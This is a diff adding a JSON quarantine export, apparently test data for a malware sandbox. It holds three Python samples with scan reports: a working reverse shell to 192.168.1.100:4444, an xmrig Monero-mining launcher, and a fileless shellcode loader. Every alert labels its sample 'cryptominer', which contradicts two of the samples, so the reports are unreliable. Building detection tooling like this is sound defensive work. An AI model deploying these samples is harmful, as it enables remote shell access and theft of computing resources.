@@ -1,0 +1,152 @@
+{
+  "export_date": "2026-06-21T10:31:30.901697",
+  "count": 3,
+  "items": [
+    {
+      "id": "q_20260621_103130_99a5feae",
+      "original_filename": "reverse_shell.py",
+      "language": "python",
+      "code": "#!/usr/bin/env python3\nimport socket\nimport subprocess\nimport os\n\ndef reverse_shell():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((\"192.168.1.100\", 4444))\n    os.dup2(s.fileno(), 0)\n    os.dup2(s.fileno(), 1)\n    os.dup2(s.fileno(), 2)\n    subprocess.call([\"/bin/sh\", \"-i\"])\n\nif __name__ == \"__main__\":\n    reverse_shell()\n",
+      "source": "email_phishing",
+      "report": {
+        "session_id": "test_20260621_103130",
+        "final_score": 86,
+        "final_level": "CRITICAL",
+        "alerts_count": 2,
+        "alerts": [
+          {
+            "timestamp": "2026-06-21T10:31:30.881282",
+            "threat_score": 86,
+            "threat_level": "CRITICAL",
+            "pattern_detected": "cryptominer",
+            "canary_triggered": false,
+            "mitre": "T1496",
+            "description": "Pattern détecté"
+          }
+        ],
+        "session_duration": 1.5,
+        "timestamp": "2026-06-21T10:31:30.881292",
+        "killed": true,
+        "exec_result": {
+          "success": true,
+          "exit_code": 0,
+          "language": "python",
+          "command": "python3 /sandbox/work/sandbox.py",
+          "duration": 0.2,
+          "timeout_passed": false,
+          "stdout": "test output",
+          "stderr": ""
+        },
+        "stats": {
+          "events_processed": 10
+        }
+      },
+      "quarantine_date": "2026-06-21T10:31:30.881361",
+      "expiry_date": "2026-06-28T10:31:30.881347",
+      "status": "pending",
+      "tags": [
+        "reverse_shell",
+        "c2",
+        "critical"
+      ],
+      "notes": "Trouvé dans email de phishing du 21/06/2026"
+    },
+    {
+      "id": "q_20260621_103130_11d84b5c",
+      "original_filename": "cryptominer.py",
+      "language": "python",
+      "code": "#!/usr/bin/env python3\nimport requests\nimport subprocess\n\nconfig = {\n    \"url\": \"stratum+ssl://pool.supportxmr.com:443\",\n    \"user\": \"4Bk...\",\n    \"pass\": \"x\"\n}\n\nsubprocess.Popen([\"xmrig\", \"-o\", config[\"url\"], \"-u\", config[\"user\"], \"-p\", config[\"pass\"]])\n",
+      "source": "upload",
+      "report": {
+        "session_id": "test_20260621_103130",
+        "final_score": 65,
+        "final_level": "HIGH",
+        "alerts_count": 2,
+        "alerts": [
+          {
+            "timestamp": "2026-06-21T10:31:30.884425",
+            "threat_score": 65,
+            "threat_level": "HIGH",
+            "pattern_detected": "cryptominer",
+            "canary_triggered": false,
+            "mitre": "T1496",
+            "description": "Pattern détecté"
+          }
+        ],
+        "session_duration": 1.5,
+        "timestamp": "2026-06-21T10:31:30.884433",
+        "killed": false,
+        "exec_result": {
+          "success": true,
+          "exit_code": 0,
+          "language": "python",
+          "command": "python3 /sandbox/work/sandbox.py",
+          "duration": 0.2,
+          "timeout_passed": false,
+          "stdout": "test output",
+          "stderr": ""
+        },
+        "stats": {
+          "events_processed": 10
+        }
+      },
+      "quarantine_date": "2026-06-21T10:31:30.884482",
+      "expiry_date": "2026-06-28T10:31:30.884468",
+      "status": "pending",
+      "tags": [
+        "cryptominer",
+        "blocked"
+      ],
+      "notes": "Uploadé par un utilisateur anonyme"
+    },
+    {
+      "id": "q_20260621_103130_be662062",
+      "original_filename": "fileless.py",
+      "language": "python",
+      "code": "#!/usr/bin/env python3\nimport ctypes\nimport mmap\nimport base64\n\nshellcode = base64.b64decode(\"SGVsbG8gV29ybGQh\")\nmem = mmap.mmap(-1, len(shellcode), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)\nmem.write(shellcode)\nctypes.CDLL(None).execve(mem, [], [])\n",
+      "source": "network_capture",
+      "report": {
+        "session_id": "test_20260621_103130",
+        "final_score": 85,
+        "final_level": "CRITICAL",
+        "alerts_count": 2,
+        "alerts": [
+          {
+            "timestamp": "2026-06-21T10:31:30.887328",
+            "threat_score": 85,
+            "threat_level": "CRITICAL",
+            "pattern_detected": "cryptominer",
+            "canary_triggered": false,
+            "mitre": "T1496",
+            "description": "Pattern détecté"
+          }
+        ],
+        "session_duration": 1.5,
+        "timestamp": "2026-06-21T10:31:30.887336",
+        "killed": true,
+        "exec_result": {
+          "success": true,
+          "exit_code": 0,
+          "language": "python",
+          "command": "python3 /sandbox/work/sandbox.py",
+          "duration": 0.2,
+          "timeout_passed": false,
+          "stdout": "test output",
+          "stderr": ""
+        },
+        "stats": {
+          "events_processed": 10
+        }
+      },
+      "quarantine_date": "2026-06-21T10:31:30.887381",
+      "expiry_date": "2026-06-28T10:31:30.887370",
+      "status": "pending",
+      "tags": [
+        "fileless",
+        "injection",
+        "critical"
+      ],
+      "notes": "Capturé sur le réseau interne"
+    }
+  ]
+}
